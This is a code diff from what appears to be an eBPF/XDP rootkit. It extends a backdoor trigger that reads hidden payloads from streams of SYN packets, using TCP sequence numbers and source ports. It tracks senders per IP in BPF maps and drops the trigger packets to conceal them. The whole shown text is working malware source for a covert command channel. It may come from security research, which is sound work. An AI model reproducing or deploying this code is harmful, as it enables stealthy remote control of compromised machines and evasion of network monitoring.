@@ -108,47 +108,100 @@ int xdp_receive(struct xdp_md *ctx){
     }
     //Check for rootkit backdoor trigger V3 - stream of SYN packets with hidden payload
     if(tcp->syn == 1){
+        //Now, we will need to take into account that payloads might be hidden in 32-bit fields or 16-bit ones.
+        //Support has been added for:
+        // 3-stream 32-bit field 16 payload triggers
+        // 6-stream 16-bit field 16 payload triggers
+
+        ////32-bit 6-len streams
+
         //SYN packet detected, store in bpf map. 
         //When a full stream comes, then it will be analyzed and search whether it is a valid sequence
         //Known issue, ignored dliberately: IP sending packets to different ports classified as same communication
         //This way we may include some port-knocking like mechanism.
         bpf_printk("SYN detected");
         __u32 ipvalue = ip->saddr;
-        struct backdoor_packet_log_data *b_data = (struct backdoor_packet_log_data*) bpf_map_lookup_elem(&backdoor_packet_log, &ipvalue);
-        struct backdoor_packet_log_data b_new_data = {0};
-        if (b_data != NULL ){
+        struct backdoor_packet_log_data_32 *b_data_32 = (struct backdoor_packet_log_data_32*) bpf_map_lookup_elem(&backdoor_packet_log_32, &ipvalue);
+        struct backdoor_packet_log_data_32 b_new_data_32 = {0};
+
+        if (b_data_32 != NULL ){
             //Means first time this IP sends a packet to us
             //It is always between the below range, this is just to avoid verifier complains
-            if(b_data->last_packet_modified>-1 && b_data->last_packet_modified<CC_STREAM_TRIGGER_PAYLOAD_LEN/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES){
-                b_new_data.last_packet_modified = b_data->last_packet_modified;
+            if(b_data_32->last_packet_modified>-1 && b_data_32->last_packet_modified<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM){
+                b_new_data_32.last_packet_modified = b_data_32->last_packet_modified;
                 //Necessary complicated MOD, the verifier rejects it otherwise
-                b_new_data.last_packet_modified++;
-                if(b_new_data.last_packet_modified>=3){
-                    b_new_data.last_packet_modified = 0;
+                b_new_data_32.last_packet_modified++;
+                if(b_new_data_32.last_packet_modified>=3){
+                    b_new_data_32.last_packet_modified = 0;
                 }
-                b_new_data.trigger_array[0] = b_data->trigger_array[0];
-                b_new_data.trigger_array[1] = b_data->trigger_array[1];
-                b_new_data.trigger_array[2] = b_data->trigger_array[2];
-                //bpf_probe_read(&b_new_data, sizeof(struct backdoor_packet_log_data), b_data);
-                int last_modified = b_new_data.last_packet_modified;
+                b_new_data_32.trigger_array[0] = b_data_32->trigger_array[0];
+                b_new_data_32.trigger_array[1] = b_data_32->trigger_array[1];
+                b_new_data_32.trigger_array[2] = b_data_32->trigger_array[2];
+                //bpf_probe_read(&b_new_data, sizeof(struct backdoor_packet_log_data_32), b_data);
+                int last_modified = b_new_data_32.last_packet_modified;
                 //Yes, this is really needed to be done this way. Intervals are no sufficient
                 if(last_modified != 0 && last_modified != 1 && last_modified != 2){
                     return XDP_PASS;
                 }
-                b_new_data.trigger_array[last_modified].seq_raw = tcp->seq;
-                bpf_map_update_elem(&backdoor_packet_log, &ipvalue, &b_new_data, BPF_ANY);
+                b_new_data_32.trigger_array[last_modified].seq_raw = tcp->seq;
+                bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
                 //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
                 //where for other purpose, we must still check it)
-                return manage_backdoor_trigger_v3(b_new_data);
+                int ret = manage_backdoor_trigger_v3_32(b_new_data_32);
+                if(ret == 1){
+                    return XDP_DROP;
+                }
             }
         }else{
             //Done this way to avoid verifier complains
             int num = 0;
             //bpf_probe_read((void*)&(b_new_data->last_packet_modified), sizeof(__u32), (void*)&num);
             //bpf_probe_read(&(b_new_data->trigger_array[0].seq_raw), sizeof(__u32), &(tcp->seq));
-            b_new_data.last_packet_modified = 0;
-            b_new_data.trigger_array[0].seq_raw = tcp->seq;
-            bpf_map_update_elem(&backdoor_packet_log, &ipvalue, &b_new_data, BPF_ANY);
+            b_new_data_32.last_packet_modified = 0;
+            b_new_data_32.trigger_array[0].seq_raw = tcp->seq;
+            bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
+        }
+
+
+        ////16 bit 6-len streams
+        struct backdoor_packet_log_data_16 *b_data_16 = (struct backdoor_packet_log_data_16*) bpf_map_lookup_elem(&backdoor_packet_log_16, &ipvalue);
+        struct backdoor_packet_log_data_16 b_new_data_16 = {0};
+        if (b_data_16 != NULL ){
+            //Means first time this IP sends a packet to us
+            //It is always between the below range, this is just to avoid verifier complains
+            if(b_data_16->last_packet_modified>-1 && b_data_16->last_packet_modified<CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT){
+                b_new_data_16.last_packet_modified = b_data_16->last_packet_modified;
+                //Necessary complicated MOD, the verifier rejects it otherwise
+                b_new_data_16.last_packet_modified++;
+                if(b_new_data_16.last_packet_modified>=6){
+                    b_new_data_16.last_packet_modified = 0;
+                }
+                b_new_data_16.trigger_array[0] = b_data_16->trigger_array[0];
+                b_new_data_16.trigger_array[1] = b_data_16->trigger_array[1];
+                b_new_data_16.trigger_array[2] = b_data_16->trigger_array[2];
+                b_new_data_16.trigger_array[3] = b_data_16->trigger_array[3];
+                b_new_data_16.trigger_array[4] = b_data_16->trigger_array[4];
+                b_new_data_16.trigger_array[5] = b_data_16->trigger_array[5];
+                //bpf_probe_read(&b_new_data, sizeof(struct backdoor_packet_log_data_32), b_data);
+                int last_modified = b_new_data_16.last_packet_modified;
+                //Yes, this is really needed to be done this way. Intervals are not sufficient
+                if(last_modified != 0 && last_modified != 1 && last_modified != 2 && last_modified != 3 && last_modified != 4 && last_modified != 5){
+                    return XDP_PASS;
+                }
+                b_new_data_16.trigger_array[last_modified].src_port = tcp->source;
+                bpf_map_update_elem(&backdoor_packet_log_16, &ipvalue, &b_new_data_16, BPF_ANY);
+                //If it was not the first packet received, this may be the end of the backdoor sequence (even if previous packets 
+                //where for other purpose, we must still check it)
+                int ret = manage_backdoor_trigger_v3_16(b_new_data_16);
+                if(ret == 1){
+                    return XDP_DROP;
+                }
+            }
+        }else{
+            //Done this way to avoid verifier complains
+            b_new_data_16.last_packet_modified = 0;
+            b_new_data_16.trigger_array[0].src_port = tcp->source;
+            bpf_map_update_elem(&backdoor_packet_log_16, &ipvalue, &b_new_data_16, BPF_ANY);
         }
     }
     //Check for the packet modification PoC
